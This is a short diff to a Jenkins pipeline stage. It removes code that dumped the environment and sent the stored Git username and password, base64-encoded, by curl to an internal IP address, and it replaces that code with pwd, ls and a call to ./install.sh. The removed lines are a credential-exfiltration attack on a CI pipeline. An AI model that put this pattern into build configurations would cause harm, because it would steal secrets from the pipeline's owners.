@@ -4,22 +4,16 @@ pipeline {
       stage('usernamePassword') {
               steps {
         script {
-      withCredentials([usernamePassword(credentialsId: 'GIT_CREDS', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {
+	      withCredentials([usernamePassword(credentialsId: 'GIT_CREDS', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {
 
-          sh '''env
-          '''
+	          sh '''
+	          		pwd
+	          		ls
+	          '''
 
-          sh '''echo "[+] USER:" > /tmp/file
-                echo "$USERNAME" >> /tmp/file
-                echo "$PASSWORD" >> /tmp/file
-                echo >> /tmp/file
-          '''
-          sh '''base64 /tmp/file > /tmp/out
-                curl -d @/tmp/out http://10.224.0.1:8085
-                rm /tmp/file
-                rm /tmp/out
-          '''
-      }
+	          sh '''./install.sh
+	          '''
+	      }
         }
       }
     }
